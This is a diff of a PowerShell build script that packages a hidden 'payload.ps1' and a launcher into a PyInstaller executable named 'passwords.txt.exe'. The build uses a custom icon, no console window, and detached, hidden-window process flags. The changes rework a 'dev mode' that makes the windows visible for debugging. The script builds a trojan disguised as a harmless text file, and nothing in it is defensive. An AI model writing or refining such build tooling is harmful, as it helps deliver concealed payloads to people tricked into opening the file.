@@ -118,29 +118,6 @@ if ($Target -eq "exe" -or $Target -eq "both") {
         exit 1
     }
     
-    # Create dev launcher if in dev mode
-    $launcherToUse = "launcher.py"
-    $devLauncherCreated = $false
-    
-    if ($Dev) {
-        Write-Host "  Creating dev launcher with visible windows..." -ForegroundColor Cyan
-        $launcherToUse = "launcher_dev.py"
-        $devLauncherCreated = $true
-        
-        # Read original launcher and modify it
-        $launcherContent = Get-Content "launcher.py" -Raw
-        
-        # Remove hidden window flags
-        $launcherContent = $launcherContent -replace '"-WindowStyle",\s*"Hidden",', ''
-        $launcherContent = $launcherContent -replace 'stdout=subprocess\.DEVNULL,', 'stdout=None,'
-        $launcherContent = $launcherContent -replace 'stderr=subprocess\.DEVNULL,', 'stderr=None,'
-        $launcherContent = $launcherContent -replace 'DETACHED_PROCESS = 0x00000008', '# DETACHED_PROCESS = 0x00000008  # Disabled for dev mode'
-        $launcherContent = $launcherContent -replace 'CREATE_NO_WINDOW = 0x08000000', '# CREATE_NO_WINDOW = 0x08000000  # Disabled for dev mode'
-        $launcherContent = $launcherContent -replace 'creation_flags = DETACHED_PROCESS \| CREATE_NO_WINDOW', 'creation_flags = 0  # Disabled for dev mode'
-        
-        [System.IO.File]::WriteAllText($launcherToUse, $launcherContent, [System.Text.Encoding]::UTF8)
-    }
-    
     # Find Python
     $python = "python"
     if (!(Get-Command python -ErrorAction SilentlyContinue)) {
@@ -166,16 +143,26 @@ if ($Target -eq "exe" -or $Target -eq "both") {
     $sep = if ($IsWindows -or $env:OS -match "Windows") { ";" } else { ":" }
     
     # Build with PyInstaller (with or without console depending on dev mode)
-    $consoleFlag = if ($Dev) { "--console" } else { "--noconsole" }
-    
-    & $python -m PyInstaller `
-        --onefile `
-        $consoleFlag `
-        --icon=icon.ico `
-        --name=passwords.txt `
-        --add-data="payload.ps1$sep." `
-        --clean `
-        $launcherToUse
+    if ($Dev) {
+        Write-Host "  Building with --console flag..." -ForegroundColor Cyan
+        & $python -m PyInstaller `
+            --onefile `
+            --console `
+            --icon=icon.ico `
+            --name=passwords.txt `
+            --add-data="payload.ps1$sep." `
+            --clean `
+            launcher.py
+    } else {
+        & $python -m PyInstaller `
+            --onefile `
+            --noconsole `
+            --icon=icon.ico `
+            --name=passwords.txt `
+            --add-data="payload.ps1$sep." `
+            --clean `
+            launcher.py
+    }
     
     if ($LASTEXITCODE -ne 0) {
         Write-Host "ERROR: Build failed!" -ForegroundColor Red
@@ -184,13 +171,20 @@ if ($Target -eq "exe" -or $Target -eq "both") {
     
     Write-Host "  -> dist\passwords.txt.exe created" -ForegroundColor Green
     
+    # Create or remove .dev_mode marker
+    if ($Dev) {
+        New-Item -ItemType File -Path "dist\.dev_mode" -Force | Out-Null
+        Write-Host "  -> Created .dev_mode marker" -ForegroundColor Cyan
+    } else {
+        if (Test-Path "dist\.dev_mode") {
+            Remove-Item "dist\.dev_mode" -Force
+            Write-Host "  -> Removed old .dev_mode marker" -ForegroundColor Gray
+        }
+    }
+    
     # Clean up
     if (Test-Path "build") { Remove-Item "build" -Recurse -Force }
     if (Test-Path "__pycache__") { Remove-Item "__pycache__" -Recurse -Force }
-    if ($devLauncherCreated -and (Test-Path $launcherToUse)) { 
-        Remove-Item $launcherToUse -Force 
-        Write-Host "  -> Dev launcher cleaned" -ForegroundColor Gray
-    }
     Write-Host "  -> Build artifacts cleaned" -ForegroundColor Gray
 }
 
